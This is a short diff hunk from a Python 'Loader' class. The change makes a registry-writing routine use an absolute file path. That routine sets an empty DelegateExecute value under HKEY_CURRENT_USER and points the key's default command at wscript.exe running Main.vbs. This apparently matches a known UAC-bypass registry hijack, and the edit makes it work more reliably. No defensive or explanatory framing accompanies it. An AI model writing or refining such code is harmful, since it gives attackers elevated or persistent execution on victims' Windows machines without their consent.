@@ -113,7 +113,7 @@ class Loader():
                         CreateKey(HKEY_CURRENT_USER, REG_PATH)
                         registry_key = OpenKey(HKEY_CURRENT_USER, REG_PATH, 0, KEY_WRITE)
                         SetValueEx(registry_key, "DelegateExecute", 0, REG_SZ, "")
-                        dirname = __file__.split("\\")
+                        dirname = os.path.abspath(__file__).split("\\")
                         dirname.pop()
                         dirname = "wscript.exe \"" + "\\".join(dirname) + "\\Main.vbs\""
                         SetValueEx(registry_key, None, 0, REG_SZ, dirname)
